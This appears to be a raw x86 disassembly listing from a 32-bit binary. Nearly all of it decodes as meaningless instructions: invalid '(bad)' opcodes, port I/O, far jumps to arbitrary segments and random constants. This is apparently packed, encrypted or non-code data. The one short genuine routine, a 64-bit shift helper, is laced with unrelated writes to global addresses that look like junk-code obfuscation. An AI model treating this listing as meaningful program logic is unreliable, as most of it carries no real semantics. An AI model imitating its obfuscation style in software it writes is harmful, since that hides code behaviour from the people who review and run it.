  4084e7:	shl    BYTE PTR [edx-0x34],0x46
  4084eb:	cmp    DWORD PTR ds:0xc1a0b3a7,ecx
  4084f1:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4084f2:	lock (bad) 
  4084f4:	retf   
  4084f5:	pop    ebp
  4084f6:	daa    
  4084f7:	or     DWORD PTR [ebx+0x69500126],0x3cf311dc
  408501:	mov    ebx,0x242ec49b
  408506:	les    ecx,FWORD PTR [ebx-0x36]
  408509:	add    eax,0x548cc679
  40850e:	xchg   edx,eax
  40850f:	or     al,bl
  408511:	mov    ch,0x11
  408513:	mov    al,0xd3
  408515:	xchg   edi,eax
  408516:	inc    ecx
  408517:	adc    DWORD PTR cs:[ecx+ecx*8+0x37178868],eax
  40851f:	imul   eax,DWORD PTR [ebx-0x23b6c945],0x1c67b95c
  408529:	(bad)  
  40852a:	(bad)  
  40852c:	pop    ss
  40852d:	(bad)
  408530:	cdq    
  408531:	inc    esi
  408532:	push   ss
  408533:	push   es
  408534:	leave  
  408535:	or     eax,DWORD PTR [ebp+0x580bc16d]
  40853b:	cmp    al,0x64
  40853d:	popa   
  40853e:	mov    al,0xe2
  408540:	jge    0x4085b5
  408542:	mov    ebp,DWORD PTR [eax+0x5b84368b]
  408548:	neg    BYTE PTR [ebx]
  40854a:	inc    edx
  40854b:	sbb    esp,DWORD PTR [edx-0x11]
  40854e:	lock push ecx
  408550:	cld    
  408551:	mov    ds:0x1560b2c0,al
  408556:	or     ebx,DWORD PTR [esi-0x4b82d439]
  40855c:	cmps   DWORD PTR ds:[si],DWORD PTR es:[di]
  40855e:	fcomp  DWORD PTR [ebx]
  408560:	jmp    DWORD PTR [edi-0x4fd472fc]
  408566:	inc    edi
  408567:	push   eax
  408568:	inc    ecx
  408569:	nop
  40856a:	sub    al,BYTE PTR [eax-0x32]
  40856d:	into   
  40856e:	cdq    
  40856f:	xchg   edi,eax
  408570:	fldcw  WORD PTR [edi-0x7]
  408573:	jns    0x408564
  408575:	push   ecx
  408576:	jns    0x40856d
  408578:	aaa    
  408579:	aad    0xf3
  40857b:	out    0xc7,eax
  40857d:	int    0x2d
  40857f:	mov    BYTE PTR [eax-0x192fe325],al
  408585:	mov    bh,0x37
  408587:	inc    ebp
  408588:	push   ds
  408589:	and    al,0x7b
  40858b:	adc    al,0xbf
  40858d:	sbb    BYTE PTR [ecx-0x57],bh
  408590:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  408591:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  408592:	jmp    0xf9f1:0x59f6d984
  408599:	call   0xe126289a
  40859e:	sub    dl,BYTE PTR [esp+edi*1-0x23c0e7d0]
  4085a5:	add    al,0x1e
  4085a7:	rol    dh,0xf5
  4085aa:	xor    DWORD PTR [edi+0x7d7e1394],esi
  4085b0:	add    al,0x33
  4085b2:	rep lods al,BYTE PTR ds:[esi]
  4085b4:	mov    bh,0x2
  4085b6:	sbb    al,0x9a
  4085b8:	pop    edi
  4085b9:	fisttp QWORD PTR [edi+eiz*8-0x43]
  4085bd:	adc    eax,0xf2ccc9b4
  4085c2:	aad    0xf3
  4085c4:	inc    ebp
  4085c5:	xor    al,0xf7
  4085c7:	add    ebp,DWORD PTR [ecx+0x365751e1]
  4085cd:	lahf   
  4085ce:	adc    ah,BYTE PTR [eax+ecx*8-0x40d16fa1]
  4085d5:	mov    esi,0x61f95265
  4085da:	cmp    eax,0x71663ed6
  4085df:	adc    BYTE PTR [edx-0x3d],0xb4
  4085e3:	push   es
  4085e4:	pop    edi
  4085e5:	imul   esp,ebx,0xcf5ea178
  4085eb:	loop   0x408650
  4085ed:	lock push ebp
  4085ef:	test   BYTE PTR [eax-0x21],dl
  4085f2:	test   esp,0x503cb6a2
  4085f8:	(bad)  
  4085f9:	jge    0x40861d
  4085fb:	test   cl,al
  4085fd:	cli    
  4085fe:	ins    BYTE PTR es:[edi],dx
  4085ff:	push   ebp
  408600:	mov    ch,0xd9
  408602:	push   ebx
  408603:	call   0xcee9:0xcfd79f49
  40860a:	jbe    0x40867e
  40860c:	sbb    DWORD PTR [ecx-0x1d],0x1050168d
  408613:	mov    dl,bl
  408615:	push   cs
  408616:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  408617:	add    edi,DWORD PTR [edi-0x3d847a52]
  40861d:	or     DWORD PTR [edx],esp
  40861f:	mov    bl,0x48
  408621:	adc    DWORD PTR [ebx-0xf],0xffffffa2
  408625:	in     al,dx
  408626:	mov    dh,0xa
  408628:	(bad)  
  40862a:	push   eax
  40862b:	cmp    BYTE PTR [edi],ch
  40862d:	jecxz  0x4085de
  40862f:	idiv   BYTE PTR [edi-0x590630b5]
  408635:	cld    
  408636:	sahf   
  408637:	cmp    eax,0xf41ffe63
  40863c:	stos   WORD PTR es:[edi],ax
  40863e:	outs   dx,BYTE PTR ds:[esi]
  40863f:	sbb    DWORD PTR [edi+0x36753da4],ebx
  408645:	mov    cl,BYTE PTR [edi]
  408647:	dec    ecx
  408648:	(bad)  [edi+ebx*8-0x72]
  40864c:	inc    ecx
  40864d:	loope  0x4085ff
  40864f:	mov    eax,0x60dba499
  408654:	and    BYTE PTR [edx+0x63],bl
  408657:	je     0x40865a
  408659:	xor    al,0xa7
  40865b:	adc    esi,DWORD PTR [eax+0x49]
  40865e:	sar    eax,1
  408660:	pop    edi
  408661:	fadd   st(1),st
  408663:	mov    esi,0xf80a35e2
  408668:	mov    edx,0x64fab78a
  40866d:	jb     0x4086c2
  40866f:	mov    esp,0x75a601a7
  408674:	pop    ebx
  408675:	adc    DWORD PTR [edi],edi
  408677:	into   
  408678:	loopne 0x40866b
  40867a:	outs   dx,DWORD PTR ds:[esi]
  40867b:	mov    esp,0x8d7c57b4
  408680:	cmp    eax,eax
  408682:	test   DWORD PTR [ebp+0x3c],edi
  408685:	jg     0x40862d
  408687:	fs cwde 
  408689:	and    esp,DWORD PTR [ebx-0x41]
  40868c:	(bad)  
  40868d:	pop    ss
  40868e:	dec    ebp
  40868f:	inc    edx
  408690:	and    BYTE PTR [ecx+0x55],0x72
  408694:	repnz mov edi,0x6c4daad9
  40869a:	(bad)  
  40869b:	ds clc 
  40869d:	or     eax,0x854b8e3b
  4086a2:	pop    ebx
  4086a3:	fisub  DWORD PTR [ebp+edi*8-0x6b706c89]
  4086aa:	sbb    ch,0x9e
  4086ad:	adc    ebp,ecx
  4086af:	adc    DWORD PTR [eax+edx*4],esp
  4086b2:	inc    edi
  4086b3:	mov    bh,0xa6
  4086b5:	aas    
  4086b6:	loop   0x40866b
  4086b8:	pushf  
  4086b9:	call   0xf8b0:0x6987fe71
  4086c0:	sahf   
  4086c1:	hlt    
  4086c2:	push   esi
  4086c3:	and    ebx,ebx
  4086c5:	jge    0x408660
  4086c7:	dec    esp
  4086c8:	or     DWORD PTR [ebp-0x16],eax
  4086cb:	and    DWORD PTR [edi*1+0x1ef86a83],ebx
  4086d2:	cmp    BYTE PTR [edx],bl
  4086d4:	into   
  4086d5:	out    0x37,eax
  4086d7:	mov    ebx,0x1fc0fbd2
  4086dc:	push   ebp
  4086dd:	fwait
  4086de:	mov    dl,0xd9
  4086e0:	xor    al,0x38
  4086e2:	mov    fs,WORD PTR [ebx-0xd84e7a6]
  4086e8:	jle    0x4086c3
  4086ea:	les    esp,FWORD PTR [edx]
  4086ec:	fst    DWORD PTR [eax-0x1b7aff81]
  4086f2:	add    DWORD PTR [ebx-0x5663a173],ecx
  4086f8:	add    eax,0xce6022b4
  4086fd:	and    eax,0x4f69a730
  408702:	dec    edi
  408703:	sbb    eax,DWORD PTR ds:[edi]
  408706:	inc    ebx
  408707:	loopne 0x4086ce
  408709:	test   al,0x83
  40870b:	and    al,0x45
  40870d:	jmp    0x24a2f5b4
  408712:	or     al,0x95
  408714:	shl    BYTE PTR [eax-0x3061f415],0x5e
  40871b:	enter  0x953d,0xe1
  40871f:	ins    DWORD PTR es:[edi],dx
  408720:	xchg   esi,eax
  408721:	enter  0xe574,0x6d
  408725:	inc    ebx
  408726:	jmp    FWORD PTR [ecx-0x23a9d5b4]
  40872c:	scas   al,BYTE PTR es:[edi]
  40872d:	add    ecx,DWORD PTR [esi+0x3b70fcba]
  408733:	jmp    0x4386:0xad436c7d
  40873a:	and    BYTE PTR [ecx-0x47e5d6fd],dh
  408740:	in     al,0x6e
  408742:	int3   
  408743:	sbb    dl,bl
  408745:	mov    al,ds:0x8f91e648
  40874a:	adc    eax,0xdf295236
  40874f:	sbb    BYTE PTR [ecx],dl
  408751:	add    eax,0x7fdd693d
  408756:	inc    ebx
  408757:	sbb    bl,BYTE PTR [esi+0x6602fa65]
  40875d:	xor    al,0xf3
  40875f:	pushf  
  408760:	stc    
  408761:	icebp  
  408762:	adc    DWORD PTR [edx+eiz*2],0xffffffcc
  408766:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  408767:	pop    eax
  408768:	dec    edx
  408769:	inc    ebp
  40876a:	adc    cl,dl
  40876c:	inc    esi
  40876d:	mov    ah,0xe9
  40876f:	xor    al,0x8e
  408771:	pop    ebp
  408772:	jl     0x4087a0
  408774:	push   esp
  408775:	icebp  
  408776:	mov    BYTE PTR [edi+0x64791db6],bl
  40877c:	pop    ebx
  40877d:	loopne 0x408716
  40877f:	daa    
  408780:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  408781:	dec    esi
  408782:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  408783:	inc    ecx
  408784:	or     al,al
  408786:	xor    al,0x47
  408788:	fistp  WORD PTR [eax-0x29]
  40878b:	xor    esi,eax
  40878d:	xchg   esp,eax
  40878e:	mov    al,0xe5
  408790:	sub    eax,0xd3f8f707
  408795:	and    bl,al
  408797:	jo     0xb199b786
  40879d:	fldcw  WORD PTR [ebx]
  40879f:	out    0xfb,eax
  4087a1:	sub    BYTE PTR [esi],dl
  4087a3:	imul   edx,DWORD PTR [eax],0x3e
  4087a6:	aam    0x46
  4087a8:	lds    eax,FWORD PTR [eax+0x18abebcd]
  4087ae:	xchg   edi,eax
  4087af:	in     al,0x2f
  4087b1:	fdivrp st(3),st
  4087b3:	out    0x6b,eax
  4087b5:	sbb    al,0x59
  4087b7:	ret    0x1256
  4087ba:	div    BYTE PTR [edi+0x48]
  4087bd:	adc    dh,bl
  4087bf:	gs std 
  4087c1:	or     eax,0xc9920866
  4087c6:	push   ebx
  4087c7:	jne    0x408750
  4087c9:	ins    DWORD PTR es:[edi],dx
  4087ca:	jbe    0x408843
  4087cc:	retf   0xf597
  4087cf:	pushf  
  4087d0:	xlat   BYTE PTR ds:[ebx]
  4087d1:	cmp    BYTE PTR [edx],ah
  4087d3:	stc    
  4087d4:	add    dh,BYTE PTR [edx+ecx*1]
  4087d7:	scas   al,BYTE PTR es:[edi]
  4087d8:	jmp    0x81a75502
  4087dd:	imul   eax
  4087df:	mov    ch,BYTE PTR [ebx]
  4087e1:	pushf  
  4087e2:	mov    ecx,edi
  4087e4:	shrd   eax,ecx,0x2
  4087e8:	or     eax,DWORD PTR [ebp+0x10]
  4087eb:	shr    ecx,0x2
  4087ee:	or     ecx,DWORD PTR [ebp+0x14]
  4087f1:	jmp    0x408b92
  4087f6:	sbb    cl,cl
  4087f8:	ins    DWORD PTR es:[edi],dx
  4087f9:	xchg   esi,eax
  4087fa:	mov    bl,0xba
  4087fc:	cmp    BYTE PTR [edx+ebp*4-0x21],cl
  408800:	xchg   esp,eax
  408801:	nop
  408802:	push   ebx
  408803:	cmp    esi,DWORD PTR [edx-0x418c4131]
  408809:	mov    esi,0xbebec4bd
  40880e:	mov    ebp,0x8ac19a81
  408813:	add    BYTE PTR [eax+0x2b],0xb4
  408817:	hlt    
  408818:	and    ch,BYTE PTR [eax]
  40881a:	sub    dh,BYTE PTR [esi+0x43]
  40881d:	out    0x89,eax
  40881f:	pop    ebx
  408820:	dec    ebx
  408821:	or     bh,ah
  408823:	aaa    
  408824:	loopne 0x408844
  408826:	pop    es
  408827:	lds    edx,FWORD PTR [ecx-0x4881daaa]
  40882d:	setne  BYTE PTR [esi+0xcf49e4f]
  408834:	mov    ch,0xaa
  408836:	mov    ah,0xc
  408838:	test   eax,0xa5406d35
  40883d:	cs pop esp
  40883f:	fwait
  408840:	inc    edx
  408841:	nop
  408842:	fdivr  DWORD PTR [eax]
  408844:	cmp    DWORD PTR [edi-0x369a2186],0xe
  40884b:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40884c:	lahf   
  40884d:	in     eax,dx
  40884e:	das    
  40884f:	pusha  
  408850:	push   0xffffffe4
  408852:	into   
  408853:	sbb    DWORD PTR [ebx],0xffffffa9
  408856:	or     DWORD PTR [ecx-0x6b7d00f],esi
  40885c:	mov    bh,0x6f
  40885e:	xor    DWORD PTR ds:0xf5e24412,ebx
  408864:	cmp    eax,0x599f8cdb
  408869:	call   0x8418218e
  40886e:	sub    ch,ch
  408870:	loopne 0x408896
  408872:	cld    
  408873:	test   al,0x87
  408875:	jbe    0x4088b6
  408877:	test   al,0x94
  408879:	adc    eax,0xdab5a214
  40887e:	jnp    0x408849
  408880:	push   ecx
  408881:	inc    esp
  408882:	stos   BYTE PTR es:[edi],al
  408883:	pop    ebx
  408884:	or     edi,DWORD PTR [edx+0x56]
  408887:	mov    eax,ds:0x5518669f
  40888c:	mov    esp,0x22568ee9
  408891:	ja     0x408843
  408893:	mov    ebp,0x41c10290
  408898:	and    bh,BYTE PTR [ebx]
  40889a:	scas   eax,DWORD PTR es:[edi]
  40889b:	ss push es
  40889d:	cmp    edx,DWORD PTR [eax+0x2648e1a1]
  4088a3:	mov    al,0x30
  4088a5:	add    eax,DWORD PTR [ecx+ecx*2]
  4088a8:	add    cl,BYTE PTR [ebx+0x5d]
  4088ab:	sbb    eax,0x3d33b39a
  4088b0:	popf   
  4088b1:	out    0xd7,eax
  4088b3:	mov    BYTE PTR [edi],dl
  4088b5:	das    
  4088b6:	std    
  4088b7:	jmp    0x2b6266f8
  4088bc:	adc    BYTE PTR [ebp-0x2d60ee3c],bh
  4088c2:	in     eax,dx
  4088c3:	fs fs push eax
  4088c6:	jp     0x408936
  4088c8:	int    0x15
  4088ca:	gs ins DWORD PTR es:[edi],dx
  4088cc:	lock pop ecx
  4088ce:	sbb    BYTE PTR [esi],ch
  4088d0:	test   al,0x49
  4088d2:	cs push eax
  4088d4:	inc    esi
  4088d5:	inc    esi
  4088d6:	jbe    0x4088c1
  4088d8:	pushf  
  4088d9:	mov    ebp,0x96047efc
  4088de:	or     DWORD PTR [edx-0xf],edx
  4088e1:	sti    
  4088e2:	(bad)  
  4088e3:	inc    edx
  4088e4:	lds    edi,FWORD PTR [esi]
  4088e6:	and    eax,0x13c421db
  4088eb:	test   DWORD PTR [ecx],esp
  4088ed:	cli    
  4088ee:	out    0xc0,al
  4088f0:	jecxz  0x40895f
  4088f2:	add    DWORD PTR [eax],ecx
  4088f4:	sub    esi,ecx
  4088f6:	lahf   
  4088f7:	outs   dx,DWORD PTR ds:[esi]
  4088f8:	(bad)  
  4088fa:	leave  
  4088fb:	call   0x9aaa91af
  408900:	pop    es
  408901:	jbe    0x4088e4
  408903:	fwait
  408904:	pop    ebp
  408905:	icebp  
  408906:	sti    
  408907:	stos   BYTE PTR es:[edi],al
  408908:	lds    esi,FWORD PTR [esi]
  40890a:	pop    ss
  40890b:	or     dl,BYTE PTR [edi+0x3ec28b05]
  408911:	iret   
  408912:	xor    BYTE PTR [eax-0x1893c4f0],bh
  408918:	jmp    0x6c6112c6
  40891d:	jp     0x408912
  40891f:	leave  
  408920:	mov    bl,0xcf
  408922:	outs   dx,DWORD PTR ds:[esi]
  408923:	xchg   esp,eax
  408924:	push   ss
  408925:	push   0x693ff2a1
  40892a:	add    eax,0x3347143c
  40892f:	aaa    
  408930:	and    bh,ch
  408932:	(bad)  
  408933:	adc    dl,bh
  408935:	cwde   
  408936:	test   eax,0xb65c4f66
  40893b:	idiv   bl
  40893d:	jmp    0xffc80367
  408942:	inc    ecx
  408943:	hlt    
  408944:	cmp    al,0xa8
  408946:	jmp    0xf690cf4
  40894b:	es mov ecx,0xce5ddcde
  408951:	arpl   WORD PTR ds:0x2e1f6a9a,dx
  408957:	mov    ebp,0xa9c2bc8
  40895c:	dec    esi
  40895d:	xor    bh,cl
  40895f:	mov    dh,0xd0
  408961:	rcl    BYTE PTR ss:[edx],cl
  408964:	loope  0x4089a8
  408966:	xchg   ebp,eax
  408967:	ja     0x4089c5
  408969:	mov    ch,bh
  40896b:	imul   esp,edi,0x92143d9d
  408971:	and    al,0x13
  408973:	jnp    0x408937
  408975:	in     eax,0x2e
  408977:	(bad)  
  408978:	add    dh,BYTE PTR [esi+eiz*2]
  40897b:	mov    esp,0xce345f95
  408980:	nop
  408981:	and    eax,0xff5641d4
  408986:	mov    eax,ds:0xe617fd79
  40898b:	ins    DWORD PTR es:[edi],dx
  40898c:	xchg   edi,eax
  40898d:	jmp    0x3bdb:0x5de4d709
  408994:	ja     0x408935
  408996:	scas   eax,DWORD PTR es:[edi]
  408997:	imul   BYTE PTR [edx+0x3de32764]
  40899d:	fstp   QWORD PTR [edi]
  40899f:	sti    
  4089a0:	js     0x4089c5
  4089a2:	test   BYTE PTR ds:0xf8426321,bh
  4089a8:	in     al,0xab
  4089aa:	jle    0x408948
  4089ac:	push   0x15
  4089ae:	retf   
  4089af:	dec    edx
  4089b0:	mov    ecx,0x762cdaa
  4089b5:	or     ecx,0x22
  4089b8:	inc    ebp
  4089b9:	xor    al,BYTE PTR [esp+ebx*8+0x370128e4]
  4089c0:	test   BYTE PTR [ecx+0x2d3d7950],0xed
  4089c7:	xchg   ebp,eax
  4089c8:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4089c9:	mov    dl,0x89
  4089cb:	loope  0x408962
  4089cd:	add    eax,0x275abefe
  4089d2:	mov    bh,0x5d
  4089d4:	pop    ebp
  4089d5:	dec    ebx
  4089d6:	mov    eax,ds:0xff7f74d5
  4089db:	(bad)  
  4089dc:	daa    
  4089dd:	out    dx,eax
  4089de:	cli    
  4089df:	cmps   BYTE PTR es:[esi],BYTE PTR es:[edi]
  4089e1:	jne    0x4089d9
  4089e3:	add    DWORD PTR [eax-0x32adce79],0x56596a7c
  4089ed:	dec    BYTE PTR [ecx+0x6f]
  4089f0:	xor    BYTE PTR [ecx],0x99
  4089f3:	in     al,0xbc
  4089f5:	or     ch,BYTE PTR [ecx*8+0x4f9b4653]
  4089fc:	adc    al,0x9f
  4089fe:	or     ebx,DWORD PTR gs:[ecx+0xd57160d]
  408a05:	and    dh,BYTE PTR [eax-0x63]
  408a08:	xchg   edi,eax
  408a09:	xor    al,dl
  408a0b:	loope  0x4089ad
  408a0d:	sbb    BYTE PTR [eax-0xbc179a2],dl
  408a13:	mov    cs,WORD PTR [ebp+0x4453183d]
  408a19:	mov    ah,0x8
  408a1b:	icebp  
  408a1c:	mov    ?,WORD PTR [ecx-0x70c3d3e7]
  408a22:	rol    BYTE PTR [edi-0x699f3bb3],1
  408a28:	cmc    
  408a29:	adc    al,al
  408a2b:	cmp    al,dl
  408a2d:	rol    BYTE PTR [eax-0x56],cl
  408a30:	out    0x4,eax
  408a32:	or     eax,0x15f5ca36
  408a37:	cmp    ebp,DWORD PTR [esi+0x49]
  408a3a:	add    bl,dl
  408a3c:	pop    ebx
  408a3d:	mul    bh
  408a3f:	es icebp 
  408a41:	dec    ebx
  408a42:	(bad)  [edi-0x5400e84e]
  408a48:	pop    esi
  408a49:	fcom   st(0)
  408a4b:	lock fist DWORD PTR [edx-0x4a]
  408a4f:	popf   
  408a50:	inc    ebp
  408a51:	inc    eax
  408a52:	mov    ebx,0xec648c5c
  408a57:	and    al,0x4a
  408a59:	xor    al,0x18
  408a5b:	aam    0x1c
  408a5d:	add    DWORD PTR [esi],edx
  408a5f:	or     edx,DWORD PTR [esi+0x219af3ca]
  408a65:	popa   
  408a66:	test   al,0xc3
  408a68:	mov    al,ds:0x91e3714
  408a6d:	xchg   edx,eax
  408a6e:	retf   
  408a6f:	xor    DWORD PTR [eax+0xb50b161],edx
  408a75:	gs pushf 
  408a77:	iret   
  408a78:	imul   BYTE PTR [ecx-0x5a2d4d65]
  408a7e:	psubsb mm5,QWORD PTR [edx]
  408a81:	sub    eax,0xb1cf6d50
  408a86:	int    0x91
  408a88:	sti    
  408a89:	pop    edx
  408a8a:	or     bl,BYTE PTR [edx+edx*2+0x59]
  408a8e:	or     ecx,DWORD PTR ds:0x6535926f
  408a94:	mov    es,WORD PTR [edx-0x4a]
  408a97:	add    cl,BYTE PTR [esi+0x40]
  408a9a:	ficomp WORD PTR [edx-0x7]
  408a9d:	inc    edi
  408a9e:	popf   
  408a9f:	aad    0xa1
  408aa1:	jecxz  0x408abb
  408aa3:	shr    DWORD PTR [ebp-0x55851655],0x7
  408aaa:	mov    dl,0x91
  408aac:	pop    ss
  408aad:	and    eax,DWORD PTR [eax-0x34f75414]
  408ab3:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  408ab4:	push   ebp
  408ab5:	and    ebx,DWORD PTR [edx+0x15]
  408ab8:	push   ebp
  408ab9:	(bad)  
  408aba:	lock retf 
  408abc:	aad    0x12
  408abe:	dec    esp
  408abf:	mov    ds,WORD PTR [ebp+0x4688813e]
  408ac5:	iret   
  408ac6:	loope  0x408acf
  408ac8:	ret    
  408ac9:	inc    esp
  408aca:	out    dx,eax
  408acb:	test   eax,0xd169d092
  408ad0:	mov    edi,0xc5eaad92
  408ad5:	adc    dh,BYTE PTR [ecx+0x44]
  408ad8:	mov    bl,0x1f
  408ada:	dec    esp
  408adb:	xlat   BYTE PTR ds:[ebx]
  408adc:	or     ch,bh
  408ade:	cmp    edi,esi
  408ae0:	sub    ch,ch
  408ae2:	jl     0x408ae2
  408ae4:	pop    edi
  408ae5:	lods   al,BYTE PTR ds:[esi]
  408ae6:	out    0x3e,al
  408ae8:	dec    edi
  408ae9:	gs inc edx
  408aeb:	or     DWORD PTR [edx+0x601358fa],eax
  408af1:	xchg   ebp,eax
  408af2:	es mov eax,0x91faf21c
  408af8:	sbb    DWORD PTR [edi],edx
  408afa:	(bad)  
  408afb:	iret   
  408afc:	out    0x3e,eax
  408afe:	lahf   
  408aff:	lods   al,BYTE PTR ds:[esi]
  408b01:	ins    DWORD PTR es:[edi],dx
  408b02:	popf   
  408b03:	jl     0x408b32
  408b05:	mov    ch,0xbb
  408b07:	fild   QWORD PTR [esi]
  408b09:	rcr    BYTE PTR gs:[ecx-0x15c69602],cl
  408b10:	pop    ebp
  408b11:	adc    dh,BYTE PTR [ebx]
  408b13:	xchg   ebx,eax
  408b14:	fisttp WORD PTR [eax+0x26]
  408b17:	aam    0xde
  408b19:	outs   dx,DWORD PTR ds:[esi]
  408b1a:	cmp    eax,0xae653480
  408b1f:	fdivr  QWORD PTR [bp+si]
  408b22:	mul    edx
  408b24:	jbe    0x408b08
  408b26:	inc    eax
  408b27:	shl    ebp,1
  408b29:	icebp  
  408b2a:	mov    ds:0x8c0f6a71,al
  408b2f:	cmp    eax,0x52445a6c
  408b34:	dec    ecx
  408b35:	fwait
  408b36:	inc    ebx
  408b37:	jns    0x408b76
  408b39:	mov    al,0x9f
  408b3b:	mov    al,ds:0xcdec4f38
  408b40:	sub    BYTE PTR [esp+esi*8+0x4b],dl
  408b44:	js     0x408b69
  408b46:	or     DWORD PTR [eax+esi*8],ebp
  408b49:	push   ebx
  408b4a:	aaa    
  408b4b:	scas   al,BYTE PTR es:[edi]
  408b4c:	dec    ecx
  408b4d:	mov    ebx,0x7eabb6ca
  408b52:	jle    0x408aed
  408b54:	and    eax,0xf148343d
  408b59:	jae    0x408bd1
  408b5b:	mov    ecx,0xaf737401
  408b60:	jns    0x408ba2
  408b62:	nop
  408b63:	gs and ebx,ecx
  408b66:	dec    esp
  408b67:	sbb    edi,DWORD PTR [edx+edi*2-0x163ac530]
  408b6e:	fst    DWORD PTR [ebp+0xe453a62]
  408b74:	std    
  408b75:	lds    edi,FWORD PTR [ebx]
  408b77:	lock es pop esp
  408b7a:	leavew 
  408b7c:	fisttp DWORD PTR [edx+0x9]
  408b7f:	xchg   esi,eax
  408b80:	loopne 0x408b48
  408b82:	mov    eax,ds:0x6ae1683
  408b87:	cmp    DWORD PTR [ebx+0x5c015b92],edi
  408b8d:	mov    ds:0x302aaccd,eax
  408b92:	cmp    edx,eax
  408b94:	jne    0x408ba3
  408b9a:	cmp    DWORD PTR [ebp+0xc],ecx
  408b9d:	je     0x408bb3
  408ba3:	push   DWORD PTR [ebp+0x20]
  408ba6:	push   DWORD PTR [ebp+0x1c]
  408ba9:	push   DWORD PTR [ebp+0x18]
  408bac:	push   ebx
  408bad:	push   esi
  408bae:	call   0x411472
  408bb3:	pop    edi
  408bb4:	leave  
  408bb5:	ret    0x1c
  408bb8:	cmp    cl,0x40
  408bbb:	jae    0x408bf8
  408bc1:	cmp    cl,0x20
  408bc4:	mov    DWORD PTR ds:0x4282ed,0x1ce5
  408bce:	jae    0x408be4
  408bd4:	xor    DWORD PTR ds:0x4284b1,0x6917
  408bde:	shrd   eax,edx,cl
  408be1:	shr    edx,cl
  408be3:	ret    
  408be4:	mov    eax,edx
  408be6:	xor    edx,edx
  408be8:	and    cl,0x1f
  408beb:	mov    DWORD PTR ds:0x428509,0x321d
  408bf5:	shr    eax,cl
  408bf7:	ret    
  408bf8:	xor    eax,eax
  408bfa:	xor    edx,edx
  408bfc:	ret    
  408bfd:	push   ebp
  408bfe:	mov    ebp,esp
  408c00:	jmp    0x408e7f
  408c05:	addr16 hlt 
  408c07:	js     0x408c4d
  408c09:	jl     0x408c57
  408c0b:	jnp    0x408c09
  408c0d:	dec    edx
  408c0e:	xlat   BYTE PTR ds:[ebx]
  408c0f:	pop    esi
  408c10:	sahf   
  408c11:	mov    esp,0xbddd74bb
  408c16:	jns    0x408bd6
  408c18:	mov    esi,0xbebec279
  408c1d:	pop    ebp
  408c1e:	jge    0x408bb3
  408c20:	mov    bl,BYTE PTR [edi+0x5559749d]
  408c26:	dec    eax
  408c27:	xchg   DWORD PTR [esi+0x3b3ce5f],esi
  408c2d:	sbb    dl,BYTE PTR [ecx]
  408c2f:	mov    dl,0x5
  408c31:	test   bh,ah
  408c33:	push   es
  408c34:	and    BYTE PTR ds:0x72ce3da5,ah
  408c3a:	js     0x408c18
  408c3c:	lahf   
  408c3d:	test   eax,0xd157d168
  408c42:	pop    ebx
  408c43:	ins    BYTE PTR es:[edi],dx
  408c44:	lods   eax,DWORD PTR ds:[esi]
  408c45:	cmp    ch,BYTE PTR [edx]
  408c47:	stc    
  408c48:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  408c49:	cld    
  408c4a:	jo     0x408be5
  408c4c:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  408c4d:	ror    DWORD PTR [ebp-0x73],0x34
  408c51:	xchg   esi,eax
  408c52:	add    DWORD PTR [ebp-0x75bd9d73],0xffffffe1
  408c59:	dec    eax
  408c5a:	add    edi,DWORD PTR [ebp+eax*1+0x344a6868]
  408c61:	aaa    
  408c62:	lods   eax,DWORD PTR ds:[esi]
  408c63:	arpl   WORD PTR [esi+edi*4-0x4579211],si
  408c6a:	pop    eax
  408c6b:	call   0x475d6854
  408c70:	clc    
  408c71:	inc    edx
  408c72:	and    edi,eax
  408c74:	mov    ch,0xf5
  408c76:	js     0x408c41
  408c78:	mov    ah,0x22
  408c7a:	lods   al,BYTE PTR ds:[esi]
  408c7b:	mov    WORD PTR [esi+0x28ce08b1],cs
  408c81:	or     esp,DWORD PTR [ebx-0x56903d84]
  408c87:	mov    al,0xdb
  408c89:	mov    ebp,0xf43c7e20
  408c8e:	or     al,0x8b
  408c90:	shl    BYTE PTR [esi+eax*2-0xf],cl
  408c94:	scas   al,BYTE PTR es:[edi]
  408c95:	adc    edi,DWORD PTR [eax+0x31439fb7]
  408c9b:	imul   ebp,DWORD PTR [eax-0x3bd0d0f6],0x7b
  408ca2:	es stos BYTE PTR es:[edi],al
  408ca4:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  408ca5:	xor    al,0xe4
  408ca7:	das    
  408ca8:	leave  
  408ca9:	stc    
  408caa:	push   ebp
  408cab:	rcl    DWORD PTR [ebx],cl
  408cad:	loope  0x408c35
  408caf:	repz test eax,0x28b3619f
  408cb5:	mov    ds,WORD PTR [edi-0x31290799]
  408cbb:	fdivp  st(6),st
  408cbd:	jbe    0x408cb6
  408cbf:	test   al,0x1e
  408cc2:	daa    
  408cc3:	outs   dx,DWORD PTR ds:[esi]
  408cc4:	push   esp
  408cc5:	retf   0x108
  408cc8:	aam    0xe3
  408cca:	sub    ebx,DWORD PTR [esp+ebx*1+0x5afb3b6c]
  408cd1:	xor    DWORD PTR [edx-0x46],eax
  408cd4:	jmp    0x7895:0x40e011d7
  408cdb:	pushf  
  408cdc:	dec    edi
  408cdd:	sub    ebp,DWORD PTR [edi+eax*8+0x36]
  408ce1:	lds    ecx,FWORD PTR [esi]
  408ce3:	or     ah,0x4a
  408ce6:	jns    0x408d3a
  408ce8:	cs in  eax,dx
  408cea:	push   0xf
  408cec:	sbb    al,0x9e
  408cee:	pop    eax
  408cef:	test   al,0x14
  408cf1:	fwait
  408cf2:	inc    edi
  408cf3:	jnp    0x408d71
  408cf5:	dec    esi
  408cf6:	mov    eax,0x28e8a24
  408cfb:	push   edx
  408cfc:	(bad)  
  408cfd:	push   ss
  408cfe:	xchg   ebx,eax
  408cff:	call   0x3ad8:0x46ed260a
  408d06:	mov    dl,bh
  408d08:	rcr    DWORD PTR [edx+0x1343ab1e],1
  408d0e:	daa    
  408d0f:	pop    es
